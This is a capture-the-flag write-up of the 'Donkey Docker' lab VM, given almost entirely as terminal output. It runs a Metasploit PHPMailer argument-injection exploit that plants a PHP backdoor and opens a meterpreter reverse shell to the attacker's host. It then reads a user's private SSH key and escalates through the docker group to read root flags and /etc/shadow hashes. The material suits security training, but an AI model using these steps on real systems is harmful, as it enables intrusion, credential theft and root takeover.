
```bash
root@kali:~# netdiscover -i eth0
Currently scanning: 192.168.108.0/16   |   Screen View: Unique Hosts                                                                                                                                          
                                                                                                                                                                                                               
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.100.100 08:00:27:f4:38:a5      1      60  PCS Systemtechnik GmbH                                                                                                                                      
 192.168.100.101 08:00:27:b7:b1:05      1      60  PCS Systemtechnik GmbH                                                                                                                                      

root@kali:~# 
root@kali:~# ifconfig 
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.100.102  netmask 255.255.255.0  broadcast 192.168.100.255
        inet6 fe80::a00:27ff:fe27:6d4  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:27:06:d4  txqueuelen 1000  (Ethernet)
        RX packets 1240570  bytes 267269026 (254.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1110027  bytes 136176211 (129.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 856976  bytes 626789152 (597.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 856976  bytes 626789152 (597.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# 

```


So the remote address is 192.168.100.101

```bash
root@kali:~# nmap -A -p 1-65535 192.168.100.101

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-01 14:28 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.100.101
Host is up (0.00040s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:38:ce:11:9c:b2:7a:48:58:c9:76:d5:b8:bd:bd:57 (RSA)
|_  256 d7:5e:f2:17:bd:18:1b:9c:8c:ab:11:09:e8:a0:00:c2 (ECDSA)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 3 disallowed entries 
|_/contact.php /index.php /about.php
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Docker Donkey
MAC Address: 08:00:27:B7:B1:05 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.6
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms 192.168.100.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.02 seconds
root@kali:~# 
```

Directory bruteforce:

```bash
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc 404,301,403.200 http://192.168.100.101/FUZZ/
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://192.168.100.101/FUZZ/
Total requests: 207643

==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

00000:  C=200     84 L	     314 W	   4090 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00001:  C=200     84 L	     314 W	   4090 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00002:  C=200     84 L	     314 W	   4090 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00003:  C=200     84 L	     314 W	   4090 Ch	  "# This work is licensed under the Creative Commons"
00006:  C=200     84 L	     314 W	   4090 Ch	  "#"
00007:  C=200     84 L	     314 W	   4090 Ch	  "# Priority ordered case insensative list, where entries were found"
00008:  C=200     84 L	     314 W	   4090 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00009:  C=200     84 L	     314 W	   4090 Ch	  "# Copyright 2007 James Fisher"
00010:  C=200     84 L	     314 W	   4090 Ch	  "# directory-list-lowercase-2.3-medium.txt"
00011:  C=200     84 L	     314 W	   4090 Ch	  "#"
00012:  C=200     84 L	     314 W	   4090 Ch	  "#"
00013:  C=500     16 L	      77 W	    616 Ch	  "index"
00016:  C=200     84 L	     314 W	   4090 Ch	  ""
00017:  C=200     84 L	     314 W	   4090 Ch	  "# on atleast 2 different hosts"
00022:  C=200     84 L	     314 W	   4090 Ch	  "#"
00043:  C=500     16 L	      77 W	    616 Ch	  "contact"
00051:  C=500     16 L	      77 W	    616 Ch	  "about"
00087:  C=403     11 L	      32 W	    296 Ch	  "icons"
00495:  C=403     11 L	      32 W	    294 Ch	  "css"
00598:  C=403     11 L	      32 W	    297 Ch	  "assets"
01562:  C=403     11 L	      32 W	    295 Ch	  "dist"
02828:  C=403     11 L	      32 W	    297 Ch	  "mailer"
41799:  C=200     84 L	     314 W	   4090 Ch	  ""
89129:  C=403     11 L	      32 W	    304 Ch	  "server-status"
207642:  C=404      9 L	      32 W	    285 Ch	  "46074"
root@kali:~#
```

Robots.txt + wfuzz reveals a rewriting rule:

contact.php->contact
about.php->about
index.php->index

Interesting in http://192.168.100.101/about

```bash
<!-- FIXME!: www-path: /www -->	
```

Fuzzing the mailer folder

```bash
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.100.101/mailer

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.100.101/mailer/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 302,307,200,204,301
=====================================================
/docs (Status: 301)
/test (Status: 301)
/language (Status: 301)
/examples (Status: 301)
/extras (Status: 301)
/LICENSE (Status: 200)
/VERSION (Status: 200)
root@kali:~#
```

Mailer version
```bash
root@kali:~# curl http://192.168.100.101/mailer/VERSION
5.2.16
root@kali:~# 
```

Metasploit used to generate the payload and set up the listener

```bash
root@kali:~# msfconsole -q -x "use exploit/multi/http/phpmailer_arg_injection; set RHOST 192.168.100.101; set WEB_ROOT /www; set target 1; set TARGETURI /contact; exploit; exit;"
RHOST => 192.168.100.101
WEB_ROOT => /www
target => 1
TARGETURI => /contact
[*] Started reverse TCP handler on 192.168.100.102:4444 
[*] Writing the backdoor to /www/ovUKE9vx.php
[*] Sleeping before requesting the payload from: /contact/ovUKE9vx.php
[*] Waiting for up to 300 seconds to trigger the payload
[!] This exploit may require manual cleanup of '/www/ovUKE9vx.php' on the target
[*] Exploit completed, but no session was created.
root@kali:~# 
```

Call url

```bash
root@kali:~# firefox http://192.168.100.101/ovUKE9vx.php
```

set up the listener

```bash
root@kali:~# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LPORT 4444; set LHOST 192.168.100.102; run"
PAYLOAD => php/meterpreter/reverse_tcp
LPORT => 4444
LHOST => 192.168.100.102
[*] Started reverse TCP handler on 192.168.100.102:4444 
[*] Starting the payload handler...
[*] Sending stage (33986 bytes) to 192.168.100.101
[*] Meterpreter session 1 opened (192.168.100.102:4444 -> 192.168.100.101:52594) at 2017-05-01 19:14:23 +0200

meterpreter > 
```

Enumeration

```bash
meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
smmta:x:104:107:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:105:108:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
smith:x:1000:100::/home/smith:/bin/bash
meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : 12081bd067cc
OS          : Linux 12081bd067cc 4.9.17-0-grsec #1-Alpine SMP Thu Mar 23 09:59:13 GMT 2017 x86_64
Meterpreter : php/linux
meterpreter > 
meterpreter > cat .htaccess
RewriteEngine On

# browser requests PHP
RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /([^\ ]+)\.php
RewriteRule ^/?(.*)\.php$ /$1 [L,R=301]

# check to see if the request is for a PHP file:
RewriteCond %{REQUEST_FILENAME}\.php -f
RewriteRule ^/?(.*)$ /$1.php [L]
meterpreter > 
meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40700/rwx------  4096  dir   2017-03-26 12:33:43 +0200  smith

meterpreter > cd smith
[-] stdapi_fs_chdir: Operation failed: 1
meterpreter > ps

Process List
============

 PID   Name                User      Path
 ---   ----                ----      ----
 1318  /usr/sbin/apache2   www-data  /usr/sbin/apache2 -f /etc/apache2/apache2.conf
 1349  /usr/sbin/apache2   www-data  /usr/sbin/apache2 -f /etc/apache2/apache2.conf
 1359  /usr/sbin/apache2   www-data  /usr/sbin/apache2 -f /etc/apache2/apache2.conf
 1372  /usr/sbin/apache2   www-data  /usr/sbin/apache2 -f /etc/apache2/apache2.conf
 1376  /usr/sbin/apache2   www-data  /usr/sbin/apache2 -f /etc/apache2/apache2.conf
 1378  /usr/sbin/apache2   www-data  /usr/sbin/apache2 -f /etc/apache2/apache2.conf
 1380  /usr/sbin/apache2   www-data  /usr/sbin/apache2 -f /etc/apache2/apache2.conf
 1381  /usr/sbin/apache2   www-data  /usr/sbin/apache2 -f /etc/apache2/apache2.conf
 1384  /usr/sbin/apache2   www-data  /usr/sbin/apache2 -f /etc/apache2/apache2.conf
 1385  /usr/sbin/apache2   www-data  /usr/sbin/apache2 -f /etc/apache2/apache2.conf
 1408  /usr/sbin/apache2   www-data  /usr/sbin/apache2 -f /etc/apache2/apache2.conf
 1415  sh                  www-data  sh -c /usr/sbin/sendmail -t -i -f"1Mf4Qv\\" -OQueueDirectory=/tmp -X/www/7RaLXwfU.php GxBH0NWfR0\"@5cDYytdZX.com
 1416  /usr/sbin/sendmail  www-data  /usr/sbin/sendmail -t -i -f1Mf4Qv\ -OQueueDirectory /tmp -X/www/7RaLXwfU.php GxBH0NWfR0"@5cDYytdZX.com
 1417  sh                  www-data  sh -c /usr/sbin/sendmail -t -i -f"oDGeHSTE\\" -OQueueDirectory=/tmp -X/www/S9IUqt2M.php EjxKeyJeHu\"@OtJq7oV.com
 1418  /usr/sbin/sendmail  www-data  /usr/sbin/sendmail -t -i -foDGeHSTE\ -OQueueDirectory=/tmp -X/www/S9IUqt2M.php EjxKeyJeHu"@OtJq7oV.com
 1419  sh                  www-data  sh -c /usr/sbin/sendmail -t -i -f"ufYr7l\\" -OQueueDirectory=/tmp -X/www/q1UItymg.php q0UfTwA\"@WKkpo.com
 1420  /usr/sbin/sendmail  www-data  /usr/sbin/sendmail -t -i -fufYr7l\ -OQueueDirectory=/tmp -X/www/q1UItymg.php q0UfTwA"@WKkpo.com
 1421  sh                  www-data  sh -c ps ax -w -o pid,user,cmd --no-header 2>/dev/null
 1422  ps                  www-data  ps ax -w -o pid,user,cmd --no-header

meterpreter > 
meterpreter > shell
Process 1423 created.
Channel 2 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty; pty.spawn("/bin/sh")'
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ su smith
su smith
Password: smith

smith@12081bd067cc:/tmp$ 
smith@12081bd067cc:/tmp$ cd $home
cd $home
smith@12081bd067cc:~$ pwd
pwd
/home/smith
smith@12081bd067cc:~$ ls -la
ls -la
total 28
drwx------ 1 smith users 4096 Mar 26 10:33 .
drwxr-xr-x 1 root  root  4096 Mar 26 10:33 ..
-rw-r--r-- 1 smith users  220 Nov  5 21:22 .bash_logout
-rw-r--r-- 1 smith users 3515 Nov  5 21:22 .bashrc
-rw-r--r-- 1 smith users  675 Nov  5 21:22 .profile
drwx--S--- 2 smith users 4096 Mar 22 05:01 .ssh
-rw-r--r-- 1 smith users  237 Mar 22 04:47 flag.txt
smith@12081bd067cc:~$ cat flag.txt
cat flag.txt
This is not the end, sorry dude. Look deeper!
I know nobody created a user into a docker
container but who cares? ;-)

But good work!
Here a flag for you: flag0{9fe3ed7d67635868567e290c6a490f8e}

PS: I like 1984 written by George ORWELL
smith@12081bd067cc:~$ 
```

enumeration of ssh

```bash
smith@12081bd067cc:~$ cd .ssh
cd .ssh
smith@12081bd067cc:~/.ssh$ ls -la
ls -la
total 20
drwx--S--- 2 smith users 4096 Mar 22 05:01 .
drwx------ 1 smith users 4096 Mar 26 10:33 ..
-rwx------ 1 smith users  101 Mar 22 05:01 authorized_keys
-rwx------ 1 smith users  411 Mar 22 04:48 id_ed25519
-rwx------ 1 smith users  101 Mar 22 04:48 id_ed25519.pub
smith@12081bd067cc:~/.ssh$ cat authorized_keys
cat authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker
smith@12081bd067cc:~/.ssh$ cat id_ed25519 
cat id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAhAQc3H36SyC4F6mO+/s+/wMLKL8/45ITnf9Hw47xKHwAAAJhsQyB3bEMg
dwAAAAtzc2gtZWQyNTUxOQAAACAhAQc3H36SyC4F6mO+/s+/wMLKL8/45ITnf9Hw47xKHw
AAAEAeyAfJp42y9KA/K5Q4M33OM5x3NDtKC2IljG4xT+orcCEBBzcffpLILgXqY77+z7/A
wsovz/jkhOd/0fDjvEofAAAAE29yd2VsbEBkb25rZXlkb2NrZXIBAg==
-----END OPENSSH PRIVATE KEY-----
smith@12081bd067cc:~/.ssh$ cat id_ed25519.pub
cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker
smith@12081bd067cc:~/.ssh$ 
```

Login with private key

```bash
root@kali:~/vmlab# nano id_ed25519
root@kali:~/vmlab# cat id_ed25519 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAhAQc3H36SyC4F6mO+/s+/wMLKL8/45ITnf9Hw47xKHwAAAJhsQyB3bEMg
dwAAAAtzc2gtZWQyNTUxOQAAACAhAQc3H36SyC4F6mO+/s+/wMLKL8/45ITnf9Hw47xKHw
AAAEAeyAfJp42y9KA/K5Q4M33OM5x3NDtKC2IljG4xT+orcCEBBzcffpLILgXqY77+z7/A
wsovz/jkhOd/0fDjvEofAAAAE29yd2VsbEBkb25rZXlkb2NrZXIBAg==
-----END OPENSSH PRIVATE KEY-----

root@kali:~/vmlab# ssh -i id_ed25519 orwell@192.168.100.101
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_ed25519' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_ed25519": bad permissions
Permission denied (publickey,keyboard-interactive).
root@kali:~/vmlab# chmod 700 id_ed25519 
root@kali:~/vmlab# ssh -i id_ed25519 orwell@192.168.100.101
Welcome to

  ___           _            ___          _
 |   \ ___ _ _ | |_____ _  _|   \ ___  __| |_____ _ _
 | |) / _ \ ' \| / / -_) || | |) / _ \/ _| / / -_) '_|
 |___/\___/_||_|_\_\___|\_, |___/\___/\__|_\_\___|_|
                        |__/
                             Made with <3 v.1.0 - 2017

This is my first boot2root - CTF VM. I hope you enjoy it.
if you run into any issue you can find me on Twitter: @dhn_
or feel free to write me a mail to:

 - Email: dhn@zer0-day.pw
 - GPG key: 0x2641123C
 - GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C

Level:       I think the level of this boot2root challange
             is hard or intermediate.

Try harder!: If you are confused or frustrated don't forget
             that enumeration is the key!

Thanks:      Special thanks to @1nternaut for the awesome
             CTF VM name!

Feedback:    This is my first boot2root - CTF VM, please
             give me feedback on how to improve!

Looking forward to the write-ups!

donkeydocker:~$ 
```

Docker enumeration

```bash
donkeydocker:~$ docker info
Containers: 1
 Running: 1
 Paused: 0
 Stopped: 0
Images: 14
Server Version: 17.03.0-ce
Storage Driver: overlay2
 Backing Filesystem: extfs
 Supports d_type: true
 Native Overlay Diff: true
Logging Driver: json-file
Cgroup Driver: cgroupfs
Plugins: 
 Volume: local
 Network: bridge host macvlan null overlay
Swarm: inactive
Runtimes: runc
Default Runtime: runc
Init Binary: docker-init
containerd version: 977c511eda0925a723debdc94d09459af49d082a
runc version: a01dafd48bc1c7cc12bdb01206f9fea7dd6feb70
init version: N/A (expected: 949e6facb77383876aeff8a6944dde66b3089574)
Kernel Version: 4.9.17-0-grsec
Operating System: Alpine Linux v3.5
OSType: linux
Architecture: x86_64
CPUs: 1
Total Memory: 240.9 MiB
Name: donkeydocker
ID: 5Q63:6UOL:473I:AVL6:VUMH:4NXT:VA3M:HHEJ:7ZMD:JWFA:WHZV:L5X6
Docker Root Dir: /var/lib/docker
Debug Mode (client): false
Debug Mode (server): false
Registry: https://index.docker.io/v1/
WARNING: No swap limit support
Experimental: false
Insecure Registries:
 127.0.0.0/8
Live Restore Enabled: false
donkeydocker:~$ docker list
docker: 'list' is not a docker command.
See 'docker --help'
donkeydocker:~$ docker ps
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
12081bd067cc        donkeydocker        "/main.sh default"   5 weeks ago         Up 6 hours          0.0.0.0:80->80/tcp   donkeydocker
donkeydocker:~$ 
```

So apache is running on a docker instance, revisiting the $home folder

```bash
donkeydocker:~$ pwd
/home/orwell
donkeydocker:~$ cat flag.txt 
You tried harder! Good work ;-)

Here a flag for your effort: flag01{e20523853d6733721071c2a4e95c9c60}

donkeydocker:~$ 
```

Probably the last flag is into the docker container itself

```bash
smith@12081bd067cc:~/.ssh$ find / -name "main.sh"
find / -name "main.sh"
find: `/var/lib/php5/sessions': Permission denied
find: `/var/lib/sendmail': Permission denied
find: `/var/log/apache2': Permission denied
find: `/var/cache/ldconfig': Permission denied
find: `/var/spool/mqueue-client': Permission denied
find: `/var/spool/mqueue': Permission denied
find: `/etc/ssl/private': Permission denied
find: `/sys/kernel': Permission denied
find: `/sys/devices/pci0000:00': Permission denied
find: `/sys/devices/uncore_arb': Permission denied
find: `/sys/devices/platform': Permission denied
find: `/sys/devices/cstate_pkg': Permission denied
find: `/sys/devices/breakpoint': Permission denied
find: `/sys/devices/pnp0': Permission denied
find: `/sys/devices/system/clockevents': Permission denied
find: `/sys/devices/system/cpu/cpufreq': Permission denied
find: `/sys/devices/system/cpu/cpu0': Permission denied
find: `/sys/devices/system/clocksource': Permission denied
find: `/sys/devices/system/container': Permission denied
find: `/sys/devices/LNXSYSTM:00': Permission denied
find: `/sys/devices/power': Permission denied
find: `/sys/devices/software': Permission denied
find: `/sys/devices/uncore_cbox': Permission denied
find: `/sys/devices/virtual': Permission denied
find: `/sys/devices/cstate_core': Permission denied
find: `/sys/devices/msr': Permission denied
find: `/sys/power': Permission denied
find: `/sys/class': Permission denied
find: `/sys/dev': Permission denied
find: `/sys/fs/ext4': Permission denied
find: `/sys/bus': Permission denied
find: `/sys/module': Permission denied
find: `/sys/block': Permission denied
find: `/sys/hypervisor': Permission denied
find: `/proc/bus': Permission denied
find: `/proc/tty/driver': Permission denied
find: `/root': Permission denied
/main.sh
smith@12081bd067cc:~/.ssh$ cat /main.sh
cat /main.sh
#!/bin/bash

# change permission
chown smith:users /home/smith/flag.txt

# Start apache
source /etc/apache2/envvars
a2enmod rewrite
apachectl -f /etc/apache2/apache2.conf

sleep 3
tail -f /var/log/apache2/*&

# Start our fake smtp server
python -m smtpd -n -c DebuggingServer localhost:25
smith@12081bd067cc:~/.ssh$ 
```

Possibilities: change any file permission via symlink through flag.txt that it's owned by smith, or google for hacking docker containers

Something interesting at: https://reventlov.com/advisories/using-the-docker-command-to-root-the-host

```bash
donkeydocker:~$ pwd
/home/orwell
donkeydocker:~$ mkdir docker-test
donkeydocker:~$ cd docker-test/
donkeydocker:~/docker-test$ cat > Dockerfile
FROM debian:wheezy

ENV WORKDIR /stuff

RUN mkdir -p $WORKDIR

VOLUME [ $WORKDIR ]

WORKDIR $WORKDIR
donkeydocker:~/docker-test$
donkeydocker:~/docker-test$ docker build -t my-docker-image .
Sending build context to Docker daemon 2.048 kB
Step 1/9 : FROM debian:wheezy
wheezy: Pulling from library/debian
1d46ed2a74b7: Pull complete 
Digest: sha256:5dc036c9a0a56f902e1d4a47d1882bd4f3f233006fa0ac9c7160f2cec083d979
Status: Downloaded newer image for debian:wheezy
 ---> e47e01d8724c
Step 2/9 : ENV WORKDIR /stuff
 ---> Running in e698bbe60744
 ---> db2ccd54cb20
Removing intermediate container e698bbe60744
Step 3/9 : RUN mkdir -p $WORKDIR
 ---> Running in ace09f0c3062
 ---> b5fd0cf81dae
Removing intermediate container ace09f0c3062
Step 4/9 : VOLUME [ $WORKDIR ]
 ---> Running in 59d358db226f
 ---> f0e2e6c49753
Removing intermediate container 59d358db226f
Step 5/9 : WORKDIR $WORKDIRFROM debian:wheezy
 ---> b6ea859384ba
Removing intermediate container b6dc95fa5ae4
Step 6/9 : ENV WORKDIR /stuff
 ---> Running in 75b67b0e1641
 ---> 04a632bd77cc
Removing intermediate container 75b67b0e1641
Step 7/9 : RUN mkdir -p $WORKDIR
 ---> Running in 2ac431687f7a
 ---> 9da6a4c0d3b1
Removing intermediate container 2ac431687f7a
Step 8/9 : VOLUME [ $WORKDIR ]
 ---> Running in ff92efb24c35
 ---> fb96cedcfccf
Removing intermediate container ff92efb24c35
Step 9/9 : WORKDIR $WORKDIR
 ---> 4f6a57c31264
Removing intermediate container d5c7e3d9f75d
Successfully built 4f6a57c31264
donkeydocker:~/docker-test$ 
```

According to the article

```bash
donkeydocker:~/docker-test$ docker run -v /:/stuff -t my-docker-image /bin/sh -c
 "ls -la /stuff/root"
total 24
drwx------  3 root root 4096 Mar 26 10:39 .
drwxr-xr-x 21 root root 4096 Mar 21 15:16 ..
-rw-r--r--  1 root root    1 Mar 26 10:39 .ash
-rw-------  1 root root   59 Mar 26 10:39 .ash_history
drwxr-xr-x  5 root root 4096 Mar 22 04:29 donkeydocker
-rw-r--r--  1 root root  195 Mar 22 04:39 flag.txt
donkeydocker:~/docker-test$ docker run -v /:/stuff -t my-docker-image /bin/sh -c
 "cat /stuff/root/flag.txt"
YES!! You did it :-). Congratulations!

I hope you enjoyed this CTF VM.

Drop me a line on twitter @dhn_, or via email dhn@zer0-day.pw

Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
donkeydocker:~/docker-test$ docker run -v /:/stuff -t my-docker-image /bin/sh -c
 "cat /stuff/etc/shadow"
root:$6$9aNeNxG0Pn6U.9ra$8m/CHc.2.yNRtcdGW7mwcpJM.f0nb5dW0GhaDaB4ANVeHwp4n9Ethlv0/QEeTYZHckyPS8UMG/QSEahulq9ku.:17247:0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
postgres:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
orwell:$6$/Jl8M7UhZVYdOnIY$WJUJ//LjpqpWQhMZjNsD3J1d8cidVUEVWb0P82BkGLSMocvqWh.fU3V48ZMfbpnUq7LRXdr8nK2XYCYSqwTJ40:17247:0:99999:7:::
donkeydocker:~/docker-test$ 
```






